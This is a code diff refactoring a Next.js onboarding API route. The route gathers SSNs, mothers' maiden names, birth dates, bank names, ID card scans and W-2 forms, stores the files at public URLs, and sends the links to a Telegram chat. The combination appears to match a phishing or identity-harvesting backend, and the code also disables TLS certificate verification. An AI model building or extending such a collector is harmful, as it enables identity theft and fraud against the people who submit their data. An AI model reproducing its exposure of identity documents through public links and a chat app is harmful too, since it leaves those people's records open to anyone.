@@ -1,24 +1,94 @@
 // app/api/onboarding/route.ts
 import { NextResponse } from "next/server";
-import { Pool } from "pg";
+import { createClient, type SupabaseClient } from "@supabase/supabase-js";
 import { randomUUID } from "crypto";
 import { sendTelegramNotification } from "@/app/lib/sendTelegramNotification";
-import { createClient } from "@supabase/supabase-js";
+import { Pool } from "pg";
 
-// ----- DB (Supabase Postgres) -----
-const pool = new Pool({
-  connectionString: process.env.DATABASE_URL,
-  ssl: { rejectUnauthorized: false },
-});
+export const runtime = "nodejs";
+export const maxDuration = 60;
 
-// ----- Supabase Storage (server client) -----
-const supabase = createClient(
-  process.env.NEXT_PUBLIC_SUPABASE_URL!,
-  process.env.SUPABASE_SERVICE_ROLE_KEY!
-);
+type Env = {
+  DATABASE_URL: string;
+  NEXT_PUBLIC_SUPABASE_URL: string;
+  SUPABASE_SERVICE_ROLE_KEY: string;
+};
+
+function requireEnv(): Env {
+  const DATABASE_URL = process.env.DATABASE_URL;
+  const NEXT_PUBLIC_SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
+  const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
+
+  // ✅ TypeScript-safe narrowing (no `!`, no casts)
+  if (!DATABASE_URL) throw new Error("Missing env var: DATABASE_URL");
+  if (!NEXT_PUBLIC_SUPABASE_URL) throw new Error("Missing env var: NEXT_PUBLIC_SUPABASE_URL");
+  if (!SUPABASE_SERVICE_ROLE_KEY) throw new Error("Missing env var: SUPABASE_SERVICE_ROLE_KEY");
+
+  return { DATABASE_URL, NEXT_PUBLIC_SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY };
+}
+
+function makePool(databaseUrl: string) {
+  return new Pool({
+    connectionString: databaseUrl,
+    ssl: { rejectUnauthorized: false },
+  });
+}
+
+function makeSupabase(url: string, serviceKey: string) {
+  return createClient(url, serviceKey, { auth: { persistSession: false } });
+}
+
+function sanitize(str: string) {
+  return str.replace(/[^a-zA-Z0-9\-_]/g, "_");
+}
+
+function guessExt(file: Blob) {
+  const type = (file.type || "").toLowerCase();
+  if (type === "image/jpeg") return "jpg";
+  if (type === "image/png") return "png";
+  if (type === "application/pdf") return "pdf";
+  const parts = type.split("/");
+  return parts[1] || "bin";
+}
+
+async function uploadToSupabase(opts: {
+  supabase: SupabaseClient;
+  file: Blob;
+  filename: string;
+}) {
+
+  const { supabase, file, filename } = opts;
+
+  const buffer = Buffer.from(await file.arrayBuffer());
+  const contentType = file.type || "application/octet-stream";
+
+  const { error: uploadError } = await supabase.storage
+    .from("onboarding")
+    .upload(filename, buffer, { contentType, upsert: true });
+
+  if (uploadError) {
+    console.error("❌ Upload error:", uploadError.message);
+    throw new Error(`Upload failed for ${filename}: ${uploadError.message}`);
+  }
+
+  const { data: urlData } = supabase.storage.from("onboarding").getPublicUrl(filename);
+
+  if (!urlData?.publicUrl) {
+    throw new Error(`Failed to get public URL for ${filename}`);
+  }
+
+  return urlData.publicUrl;
+}
 
 export async function POST(req: Request) {
+  let pool: Pool | null = null;
+
   try {
+    const env = requireEnv();
+
+    pool = makePool(env.DATABASE_URL);
+    const supabase = makeSupabase(env.NEXT_PUBLIC_SUPABASE_URL, env.SUPABASE_SERVICE_ROLE_KEY);
+
     const formData = await req.formData();
     const get = (key: string) => formData.get(key)?.toString().trim() ?? "";
 
@@ -28,7 +98,6 @@ export async function POST(req: Request) {
     const last_name = get("last_name");
     const mother_maiden = get("motherMaidenName");
 
-    // ✅ SSN normalized to digits only
     const ssn_raw = get("ssn");
     const ssn_digits = ssn_raw.replace(/\D/g, "");
     const ssn = ssn_digits ? ssn_digits : null;
@@ -46,50 +115,25 @@ export async function POST(req: Request) {
     if (!applicant_id || !first_name || !last_name) {
       return NextResponse.json(
         { error: "Missing applicant_id, first_name, or last_name." },
-        { status: 400 }
+        { status: 400 },
       );
     }
 
     if (![street, city, state, zip_code].every(Boolean)) {
-      return NextResponse.json(
-        { error: "All address fields are required." },
-        { status: 400 }
-      );
+      return NextResponse.json({ error: "All address fields are required." }, { status: 400 });
     }
 
-    // ✅ Validate SSN if provided
     if (ssn && !/^\d{9}$/.test(ssn)) {
-      return NextResponse.json(
-        { error: "SSN must be exactly 9 digits." },
-        { status: 400 }
-      );
+      return NextResponse.json({ error: "SSN must be exactly 9 digits." }, { status: 400 });
     }
 
     const front_image = formData.get("front_image");
     const back_image = formData.get("back_image");
     const w2_form = formData.get("w2_form");
 
-    if (
-      !(front_image instanceof Blob) ||
-      !(back_image instanceof Blob) ||
-      !(w2_form instanceof Blob)
-    ) {
-      return NextResponse.json(
-        { error: "Missing or invalid file(s)." },
-        { status: 400 }
-      );
+    if (!(front_image instanceof Blob) || !(back_image instanceof Blob) || !(w2_form instanceof Blob)) {
+      return NextResponse.json({ error: "Missing or invalid file(s)." }, { status: 400 });
     }
-
-    const sanitize = (str: string) => str.replace(/[^a-zA-Z0-9\-_]/g, "_");
-
-    const guessExt = (file: Blob) => {
-      const type = (file.type || "").toLowerCase();
-      if (type === "image/jpeg") return "jpg";
-      if (type === "image/png") return "png";
-      if (type === "application/pdf") return "pdf";
-      const parts = type.split("/");
-      return parts[1] || "bin";
-    };
 
     const generateFilename = (label: string, file: Blob) => {
       const ext = guessExt(file);
@@ -97,42 +141,15 @@ export async function POST(req: Request) {
       return `${label}/${cleanName}-${randomUUID()}.${ext}`;
     };
 
-    const uploadToSupabase = async (file: Blob, filename: string) => {
-      const buffer = Buffer.from(await file.arrayBuffer());
-      const contentType = file.type || "application/octet-stream";
-
-      const { error: uploadError } = await supabase.storage
-        .from("onboarding") // bucket name must exist exactly
-        .upload(filename, buffer, {
-          contentType,
-          upsert: true,
-        });
-
-      if (uploadError) {
-        console.error("❌ Upload error:", uploadError.message);
-        throw new Error(`Upload failed for ${filename}: ${uploadError.message}`);
-      }
-
-      const { data: urlData } = supabase.storage
-        .from("onboarding")
-        .getPublicUrl(filename);
-
-      if (!urlData?.publicUrl) {
-        throw new Error(`Failed to get public URL for ${filename}`);
-      }
-
-      return urlData.publicUrl;
-    };
-
     const front_image_filename = generateFilename("front", front_image);
     const back_image_filename = generateFilename("back", back_image);
     const w2_form_filename = generateFilename("w2", w2_form);
 
-    const front_url = await uploadToSupabase(front_image, front_image_filename);
-    const back_url = await uploadToSupabase(back_image, back_image_filename);
-    const w2_url = await uploadToSupabase(w2_form, w2_form_filename);
-
-    console.log("✅ Files uploaded");
+    const [front_url, back_url, w2_url] = await Promise.all([
+      uploadToSupabase({ supabase, file: front_image, filename: front_image_filename }),
+      uploadToSupabase({ supabase, file: back_image, filename: back_image_filename }),
+      uploadToSupabase({ supabase, file: w2_form, filename: w2_form_filename }),
+    ]);
 
     await pool.query(
       `INSERT INTO onboarding (
@@ -180,7 +197,7 @@ export async function POST(req: Request) {
         middle_name || null,
         last_name,
         mother_maiden || null,
-        ssn, // ✅ 9 digits or null
+        ssn,
         date_of_birth || null,
         street,
         city,
@@ -195,30 +212,30 @@ export async function POST(req: Request) {
         front_image_filename,
         back_image_filename,
         w2_form_filename,
-      ]
+      ],
     );
 
-    console.log("✅ Onboarding data inserted");
-
-    try {
-      await sendTelegramNotification(
-        `
-📥 New Onboarding: ${first_name} ${last_name} (${bank_name})
+    // Fire-and-forget notification
+    sendTelegramNotification(
+      `📥 New Onboarding: ${first_name} ${last_name} (${bank_name})
 🔗 Front ID: ${front_url}
 🔗 Back ID: ${back_url}
-📄 W-2: ${w2_url}
-        `.trim()
-      );
-    } catch (e) {
-      console.error("Telegram failed:", e);
-    }
+📄 W-2: ${w2_url}`.trim(),
+    ).catch((e) => console.error("Telegram failed:", e));
 
     return NextResponse.json({ success: true });
   } catch (err: any) {
     console.error("❌ Onboarding failed:", err?.message || err);
-    return NextResponse.json(
-      { error: "Failed to complete onboarding." },
-      { status: 500 }
-    );
+
+    const msg = String(err?.message || "");
+    if (msg.startsWith("Missing env var:")) {
+      return NextResponse.json({ error: msg }, { status: 500 });
+    }
+
+    return NextResponse.json({ error: "Failed to complete onboarding." }, { status: 500 });
+  } finally {
+    try {
+      await pool?.end();
+    } catch {}
   }
 }
